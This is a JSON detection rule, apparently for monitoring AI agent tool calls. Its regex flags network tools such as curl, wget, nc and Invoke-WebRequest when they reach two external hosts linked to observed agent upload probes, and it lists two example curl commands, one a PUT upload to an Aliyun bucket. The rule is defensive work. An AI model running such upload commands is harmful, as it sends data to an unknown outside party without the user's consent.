{
  "specVersion": 1,
  "id": "agent-egress/agent-probe-host",
  "name": "Host used in observed agent upload probes",
  "category": "custom",
  "severity": "critical",
  "matcher": {
    "type": "regex",
    "pattern": "^[ \\t]*['\"]?https?://(?:[^\\s/@]{1,100}@)?(?:[\\w-]{1,63}\\.){0,6}?(?:sanmaohe\\.oss-cn-beijing(?:-internal)?\\.aliyuncs\\.com(?![\\w-]|\\.[\\w-])|routify-file-proxy-sg(?!\\w))|\\b(?=(?:curl|wget|ncat|nc|socat|telnet|http|https|xh|aria2c|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|ping|dig|nslookup)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:curl|wget|ncat|nc|socat|telnet|http|https|xh|aria2c|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|ping|dig|nslookup)\\b(?:[^\\n;|&\\\\]|\\\\[\\s\\S]|&(?!&)){0,400}?(?<![\\w-])(?:sanmaohe\\.oss-cn-beijing(?:-internal)?\\.aliyuncs\\.com(?![\\w-]|\\.[\\w-])|routify-file-proxy-sg(?!\\w))|\\b(?=(?:python[0-9.]{0,4}|node|deno|bun|ruby|perl|php|pwsh|powershell)\\b)(?<=(?:^|[;&|({\\x60'\"]|\\$\\()[ \\t]*(?:(?:sudo|doas|command|exec|nohup|time)[ \\t]+(?:-[A-Za-z]{1,8}[ \\t]+){0,3})?(?:[\\w.~-]*/){0,8})(?:python[0-9.]{0,4}|node|deno|bun|ruby|perl|php|pwsh|powershell)\\b[^\\n]{0,400}?(?<![\\w-])(?:sanmaohe\\.oss-cn-beijing(?:-internal)?\\.aliyuncs\\.com(?![\\w-]|\\.[\\w-])|routify-file-proxy-sg(?!\\w))",
    "flags": "gi"
  },
  "examples": [
    "curl -X PUT --data-binary \"x\" http://sanmaohe.oss-cn-beijing.aliyuncs.com/upload/test.bin",
    "curl -s https://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/f/1"
  ],
  "appliesTo": {
    "eventKinds": ["tool_use"]
  }
}
